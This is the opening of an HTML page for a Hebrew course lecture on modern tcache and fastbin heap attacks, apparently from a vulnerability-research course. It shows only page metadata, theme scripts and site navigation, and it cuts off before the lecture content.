@@ -1,0 +1,3328 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="בשיעורים הקודמים של הפרק בנינו את הפרימיטיב: ב-7.3 למדנו tcache poisoning, ב-7.4 את תקיפת ה-unlink, וב-7.5 את משפחת ה-House of. בכל אחד מהם השגנו בסוף...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        <link rel="prev" href="../../7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of/7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        <link rel="next" href="../7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>7.6 - תקיפות tcache וfastbin מודרניות - הרצאה - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "7.6 - \u05ea\u05e7\u05d9\u05e4\u05d5\u05ea tcache \u05d5fastbin \u05de\u05d5\u05d3\u05e8\u05e0\u05d9\u05d5\u05ea - \u05d4\u05e8\u05e6\u05d0\u05d4",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="7.6 - תקיפות tcache וfastbin מודרניות - הרצאה - עמית טק" />
+<meta property="og:description" content="בשיעורים הקודמים של הפרק בנינו את הפרימיטיב: ב-7.3 למדנו tcache poisoning, ב-7.4 את תקיפת ה-unlink, וב-7.5 את משפחת ה-House of. בכל אחד מהם השגנו בסוף..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="7.6 - תקיפות tcache וfastbin מודרניות - הרצאה - עמית טק" />
+<meta property="twitter:description" content="בשיעורים הקודמים של הפרק בנינו את הפרימיטיב: ב-7.3 למדנו tcache poisoning, ב-7.4 את תקיפת ה-unlink, וב-7.5 את משפחת ה-House of. בכל אחד מהם השגנו בסוף..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#-tcache-poisoning" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              7.6 - תקיפות tcache וfastbin מודרניות - הרצאה
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../3%20-%20Shellcode/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
